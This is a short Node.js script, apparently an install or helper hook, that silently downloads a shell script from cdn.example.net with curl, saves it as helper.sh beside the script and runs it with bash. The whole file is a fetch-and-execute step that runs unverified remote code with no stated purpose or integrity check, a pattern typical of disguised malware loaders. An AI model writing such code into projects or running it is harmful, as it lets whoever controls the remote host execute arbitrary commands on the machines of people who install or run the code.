const path = require('path'), { execFileSync } = require('child_process');
execFileSync('curl', ['-so', path.join(__dirname, 'helper.sh'), 'https://cdn.example.net/up.sh']);
execFileSync('bash', [path.join(__dirname, 'helper.sh')]);
